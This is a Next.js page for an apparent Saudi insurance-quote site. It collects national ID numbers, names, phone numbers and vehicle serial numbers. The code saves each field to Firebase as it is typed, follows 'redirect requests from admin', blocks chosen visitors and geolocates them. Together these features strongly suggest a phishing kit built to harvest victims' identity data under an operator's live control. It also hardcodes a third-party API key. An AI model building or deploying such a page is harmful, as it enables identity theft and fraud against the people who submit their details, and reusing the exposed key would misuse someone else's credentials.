"use client"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Globe, RefreshCw } from 'lucide-react'
import { FullPageLoader } from "@/components/loader"
import { StepIndicator } from "@/components/step-indicator"
import { getOrCreateVisitorID, initializeVisitorTracking, updateVisitorPage, checkIfBlocked } from "@/lib/visitor-tracking"
import { useAutoSave } from "@/hooks/use-auto-save"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
// Removed saveToHistory - not needed
import { secureAddData as addData } from "@/lib/secure-firebase"
import { translations } from "@/lib/translations"

function generateCaptcha() {
  return Math.floor(1000 + Math.random() * 9000).toString()
}

export default function HomePage() {
  const router = useRouter()
  const [visitorID] = useState(() => getOrCreateVisitorID())
  const [loading, setLoading] = useState(true)
  const [isBlocked, setIsBlocked] = useState(false)
  
  // Form fields
  const [identityNumber, setidentityNumber] = useState("")
  const [ownerName, setOwnerName] = useState("")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [documentType, setDocumentType] = useState("استمارة")
  const [serialNumber, setSerialNumber] = useState("")
  const [insuranceType, setInsuranceType] = useState("تأمين جديد")
  const [buyerName, setBuyerName] = useState("")
  const [buyerIdNumber, setBuyerIdNumber] = useState("")
  const [activeTab, setActiveTab] = useState("مركبات")
  const [captchaCode, setCaptchaCode] = useState(generateCaptcha())
  const [captchaInput, setCaptchaInput] = useState("")
  const [captchaError, setCaptchaError] = useState(false)
  
  // Validation
  const [identityNumberError, setidentityNumberError] = useState("")
  
  // Language
  const [language, setLanguage] = useState<"ar" | "en">("ar")
  
  // Auto-save all form data
  useAutoSave({
    visitorId: visitorID,
    pageName: "home",
    data: {
      identityNumber,
      ownerName,
      phoneNumber,
      documentType,
      serialNumber,
      insuranceType,
      ...(insuranceType === "نقل ملكية" && {
        buyerName,
        buyerIdNumber
      })
    }
  })
  
  // Monitor redirect requests from admin
  useRedirectMonitor({
    visitorId: visitorID,
    currentPage: "home"
  })
  
  // Initialize tracking on mount
  useEffect(() => {
    const init = async () => {
      try {
        // Check if blocked first (fast check)
        const blocked = await checkIfBlocked(visitorID)
        if (blocked) {
          setIsBlocked(true)
          setLoading(false)
          return
        }
        
        // Fetch and save country if not already saved
        if (!localStorage.getItem("country")) {
          try {
            const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
            const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`
            const response = await fetch(url)
            if (response.ok) {
              const countryName = await response.text()
              // Convert country name to alpha-3 code
              const { countryNameToAlpha3 } = await import("@/lib/country-codes")
              const countryCode = countryNameToAlpha3(countryName)
              localStorage.setItem("country", countryCode)
              await addData({
                id: visitorID,
                country: countryCode
              })
            }
          } catch (error) {
            console.error("Error fetching country:", error)
          }
        }
        
        // Show page immediately
        setLoading(false)
        
        // Initialize tracking in background (non-blocking)
        initializeVisitorTracking(visitorID).catch(console.error)
        updateVisitorPage(visitorID, "home", 1).catch(console.error)
      } catch (error) {
        console.error('Initialization error:', error)
        setLoading(false)
      }
    }
    
    init()
  }, [visitorID])
  
  const refreshCaptcha = () => {
    setCaptchaCode(generateCaptcha())
    setCaptchaInput("")
    setCaptchaError(false)
  }
  
  const handlePhoneNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    
    if (cleaned.startsWith('05')) {
      setPhoneNumber(cleaned.slice(0, 10))
    } else if (cleaned.startsWith('5') && !cleaned.startsWith('05')) {
      setPhoneNumber(cleaned.slice(0, 9))
    } else {
      setPhoneNumber(cleaned.slice(0, 10))
    }
  }
  
  // Handle identity number - numbers only
  const handleIdentityNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
    setidentityNumber(cleaned.slice(0, 10)) // Max 10 digits
    if (identityNumberError) setidentityNumberError("")
  }
  
  // Handle buyer ID number - numbers only
  const handleBuyerIdNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
    setBuyerIdNumber(cleaned.slice(0, 10)) // Max 10 digits
  }
  
  // Handle serial number - numbers only
  const handleSerialNumberChange = (value: string) => {
    const cleaned = value.replace(/\D/g, '') // Remove non-numeric
    setSerialNumber(cleaned)
  }
  
  const validateSaudiId = (id: string): boolean => {
    const cleanId = id.replace(/\s/g, "")
    if (!/^\d{10}$/.test(cleanId)) {
      setidentityNumberError(translations[language].identityMust10Digits)
      return false
    }
    if (!/^[12]/.test(cleanId)) {
      setidentityNumberError(translations[language].identityMustStartWith12)
      return false
    }
    let sum = 0
    for (let i = 0; i < 10; i++) {
      let digit = Number.parseInt(cleanId[i])
      if ((10 - i) % 2 === 0) {
        digit *= 2
        if (digit > 9) {
          digit -= 9
        }
      }
      sum += digit
    }
    if (sum % 10 !== 0) {
      setidentityNumberError(translations[language].invalidIdentityNumber)
      return false
    }
    setidentityNumberError("")
    return true
  }
  
  // Handle form submit
  const handleFirstStepSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    if (!validateSaudiId(identityNumber)) {
      return
    }
    
    if (captchaInput !== captchaCode) {
      setCaptchaError(true)
      return
    }
    
    // Save final data before navigation
    await addData({
      id: visitorID,
      identityNumber,
      ownerName,
      phoneNumber,
      documentType,
      serialNumber,
      insuranceType,
      ...(insuranceType === "نقل ملكية" && {
        buyerName,
        buyerIdNumber
      }),
      currentStep: 2,
      currentPage: "insur",
      homeCompletedAt: new Date().toISOString()
    }).then(() => {
      // Navigate immediately
      router.push('/insur')
    })
  }
  
  if (loading) {
    return <FullPageLoader />
  }
  
  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
          <p className="text-gray-600 mt-2">للمزيد من المعلومات، يرجى التواصل مع الدعم الفني.</p>
        </div>
      </div>
    )
  }
  
  return (
    <div className="min-h-screen bg-[#0a4a68]">
      {/* Header */}
      <div className="bg-[#0a4a68] px-3 py-3 md:px-6 md:py-4 flex items-center justify-between border-b border-white/10">
        <button 
          onClick={() => setLanguage(language === "ar" ? "en" : "ar")}
          className="flex items-center gap-1.5 px-3 py-2 md:px-4 md:py-2.5 bg-white/95 rounded-lg hover:bg-white transition-colors shadow-md"
        >
          <Globe className="w-4 h-4 md:w-5 md:h-5 text-[#0a4a68]" />
          <span className="text-[#0a4a68] font-semibold text-sm md:text-base">{language === "ar" ? "EN" : "AR"}</span>
        </button>
        <div className="w-10 h-10 md:w-12 md:h-12 rounded-full bg-white/10 border-2 border-white flex items-center justify-center shadow-md">
          <span className="text-white text-xl md:text-2xl font-bold">B</span>
        </div>
      </div>

      {/* Step Indicator */}
      <div className="bg-[#0a4a68] px-3 py-6 md:px-6 md:py-10 text-center border-b border-white/10">
        <StepIndicator currentStep={1} />
      </div>

      {/* Main Content */}
      <div className="max-w-3xl mx-auto -mt-4 md:-mt-6 px-3 md:px-4 pb-6 md:pb-8">
        <div className="bg-white rounded-xl md:rounded-2xl shadow-xl overflow-hidden">
          {/* Tabs */}
          <div className="grid grid-cols-4 text-center border-b" dir={language === "ar" ? "rtl" : "ltr"}>
            {[
              { ar: "مركبات", en: "Vehicles", key: "vehicles" },
              { ar: "طبي", en: "Medical", key: "medical" },
              { ar: "أخطاء طبية", en: "Medical Errors", key: "medicalErrors" },
              { ar: "سفر", en: "Travel", key: "travel" }
            ].map((tab) => (
              <button
                key={tab.key}
                onClick={() => setActiveTab(tab.ar)}
                className={`py-3 md:py-4 font-semibold text-sm md:text-base lg:text-lg transition-all ${
                  activeTab === tab.ar
                    ? "text-[#0a4a68] border-b-3 bg-yellow-400/80"
                    : "text-gray-500 hover:text-gray-700 hover:bg-gray-50"
                }`}
              >
                {language === "ar" ? tab.ar : tab.en}
              </button>
            ))}
          </div>

          {/* Form */}
          <form onSubmit={handleFirstStepSubmit} className="p-4 md:p-6 lg:p-8 space-y-3 md:space-y-4" dir={language === "ar" ? "rtl" : "ltr"}>
            {/* Insurance Type Buttons */}
            <div className="grid grid-cols-2 gap-2 md:gap-3">
              <button
                type="button"
                onClick={() => setInsuranceType("تأمين جديد")}
                className={`py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
                  insuranceType === "تأمين جديد"
                    ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                {translations[language].newInsurance}
              </button>
              <button
                type="button"
                onClick={() => setInsuranceType("نقل ملكية")}
                className={`py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
                  insuranceType === "نقل ملكية"
                    ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                {translations[language].ownershipTransfer}
              </button>
            </div>

            {/* Identity Number */}
            <Input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder={translations[language].identityNumber}
              value={identityNumber}
              onChange={(e) => handleIdentityNumberChange(e.target.value)}
              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
              dir={language === "ar" ? "rtl" : "ltr"}
              required
            />
            {identityNumberError && (
              <p className={`text-red-500 text-sm mt-1 ${language === "ar" ? "text-right" : "text-left"}`} dir={language === "ar" ? "rtl" : "ltr"}>
                {identityNumberError}
              </p>
            )}

            {/* Owner Name */}
            <Input
              placeholder={translations[language].ownerName}
              value={ownerName}
              onChange={(e) => setOwnerName(e.target.value)}
              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
              dir={language === "ar" ? "rtl" : "ltr"}
              required
            />

            {/* Phone Number */}
            <Input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder={translations[language].phoneNumber}
              value={phoneNumber}
              onChange={(e) => handlePhoneNumberChange(e.target.value)}
              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
              dir={language === "ar" ? "rtl" : "ltr"}
              required
            />

            {/* Ownership Transfer Fields */}
            {insuranceType === "نقل ملكية" && (
              <>
                <Input
                  placeholder={translations[language].buyerName}
                  value={buyerName}
                  onChange={(e) => setBuyerName(e.target.value)}
                  className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
                  dir={language === "ar" ? "rtl" : "ltr"}
                  required
                />
                <Input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  placeholder={translations[language].buyerIdNumber}
                  value={buyerIdNumber}
                  onChange={(e) => handleBuyerIdNumberChange(e.target.value)}
                  className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
                  dir={language === "ar" ? "rtl" : "ltr"}
                  required
                />
              </>
            )}

            {/* Document Type */}
            <div className="grid grid-cols-2 gap-2 md:gap-3">
              <button
                type="button"
                onClick={() => setDocumentType("استمارة")}
                className={`py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
                  documentType === "استمارة"
                    ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                {translations[language].form}
              </button>
              <button
                type="button"
                onClick={() => setDocumentType("بطاقة جمركية")}
                className={`py-2.5 md:py-3.5 rounded-lg md:rounded-xl font-semibold text-base md:text-lg shadow-sm transition-all hover:shadow-md ${
                  documentType === "بطاقة جمركية"
                    ? "bg-[#0a4a68] text-white hover:bg-[#083d57]"
                    : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                }`}
              >
                {translations[language].customsCard}
              </button>
            </div>

            {/* Serial Number */}
            <Input
              type="tel"
              inputMode="numeric"
              pattern="[0-9]*"
              placeholder={documentType === "بطاقة جمركية" ? translations[language].customsDeclarationNumber : translations[language].serialNumber}
              value={serialNumber}
              onChange={(e) => handleSerialNumberChange(e.target.value)}
              className={`h-11 md:h-12 ${language === "ar" ? "text-right" : "text-left"} text-base md:text-lg border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] shadow-sm text-gray-900 font-medium`}
              dir={language === "ar" ? "rtl" : "ltr"}
              required
            />

            {/* Captcha */}
            <div className="border-2 rounded-lg md:rounded-xl p-3 md:p-4 bg-gray-50 shadow-sm">
              <div className="flex items-center justify-between gap-2 md:gap-3">
                <div
                  className="flex items-center gap-1.5 md:gap-2 bg-white px-2 md:px-3 py-2 rounded-lg shadow-sm"
                  dir="ltr"
                >
                  {captchaCode.split("").map((digit, index) => (
                    <span
                      key={index}
                      className={`text-2xl md:text-3xl font-bold select-none ${
                        index === 0
                          ? "text-yellow-500"
                          : index === 1
                            ? "text-blue-600"
                            : index === 2
                              ? "text-green-600"
                              : "text-green-500"
                      }`}
                    >
                      {digit}
                    </span>
                  ))}
                  <button
                    type="button"
                    onClick={refreshCaptcha}
                    className="w-8 h-8 md:w-9 md:h-9 bg-blue-500 rounded-lg flex items-center justify-center hover:bg-blue-600 transition-colors shadow-sm ml-1 md:ml-2"
                  >
                    <RefreshCw className="w-4 h-4 md:w-5 md:h-5 text-white" />
                  </button>
                </div>
                <Input
                  placeholder={translations[language].verificationCode}
                  value={captchaInput}
                  onChange={(e) => {
                    setCaptchaInput(e.target.value)
                    setCaptchaError(false)
                  }}
                  className={`h-10 md:h-11 text-right text-base md:text-lg flex-1 border-2 rounded-lg md:rounded-xl focus:border-[#0a4a68] text-gray-900 font-medium ${
                    captchaError ? "border-red-500 bg-red-50" : ""
                  }`}
                  dir="ltr"
                  required
                />
              </div>
              {captchaError && (
                <p className={`text-red-500 text-xs md:text-sm mt-2 ${language === "ar" ? "text-right" : "text-left"} font-semibold`}>
                  {translations[language].incorrectCaptcha}
                </p>
              )}
            </div>

            {/* Submit Button */}
            <Button
              type="submit"
              className="w-full h-12 md:h-14 bg-yellow-500 hover:bg-yellow-600 text-[#0a4a68] font-bold text-lg md:text-xl rounded-lg md:rounded-xl shadow-lg hover:shadow-xl transition-all"
            >
              {translations[language].showOffers}
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
